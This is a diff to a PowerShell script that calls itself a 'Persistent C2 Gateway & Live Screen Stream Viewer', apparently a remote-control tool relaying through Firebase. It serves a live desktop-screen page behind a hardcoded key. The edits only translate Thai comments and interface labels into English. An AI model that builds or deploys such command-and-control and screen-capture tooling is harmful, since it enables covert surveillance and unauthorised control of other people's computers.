@@ -1,4 +1,4 @@
-﻿# ==============================================================================
+# ==============================================================================
 # CMD_Remote Controller Turbo Bridge (Local Daemon)
 # Port: 127.0.0.1:5999
 # High-Speed Persistent C2 Gateway & Live Screen Stream Viewer
@@ -45,7 +45,7 @@ function Invoke-FirebaseQuick {
     $req.Timeout = $TimeoutMs
     $req.ReadWriteTimeout = $TimeoutMs
     $req.KeepAlive = $true
-    $req.Proxy = $null # ตัด Proxy lookup เพื่อความเร็วสูงสุด
+    $req.Proxy = $null # Disable proxy lookup for maximum speed
 
     if (-not [string]::IsNullOrEmpty($Body)) {
         $req.ContentType = "application/json; charset=utf-8"
@@ -74,7 +74,7 @@ function Get-LiveHtmlPage {
     param([string]$Key = "2816")
     return @"
 <!DOCTYPE html>
-<html lang="th">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -103,7 +103,7 @@ function Get-LiveHtmlPage {
 <body>
     <header>
         <div class="logo">
-            <span>⚡ CMD_Remote Ultra-Realtime C2</span>
+            <span>[TURBO] CMD_Remote Ultra-Realtime C2</span>
             <span class="badge">Live 5-10 FPS</span>
         </div>
         <div class="stats">
@@ -116,8 +116,8 @@ function Get-LiveHtmlPage {
         <div class="screen-wrapper">
             <img id="live-canvas" src="/api/screen?key=$Key" alt="Live Desktop Screen" />
             <div class="controls-bar">
-                <button onclick="togglePause()" id="btn-pause">พักการสตรีม (Pause)</button>
-                <button class="secondary" onclick="refreshNow()">ถ่ายภาพใหม่ (Refresh)</button>
+                <button onclick="togglePause()" id="btn-pause">Pause Stream</button>
+                <button class="secondary" onclick="refreshNow()">Refresh Now</button>
                 <span class="fps-badge" id="stream-status">Active Adaptive</span>
             </div>
         </div>
@@ -164,7 +164,7 @@ function Get-LiveHtmlPage {
 
         function togglePause() {
             isPaused = !isPaused;
-            btnPause.innerText = isPaused ? "เริ่มสตรีมต่อ (Resume)" : "พักการสตรีม (Pause)";
+            btnPause.innerText = isPaused ? "Resume Stream" : "Pause Stream";
             btnPause.style.background = isPaused ? "#059669" : "#2563eb";
         }
 
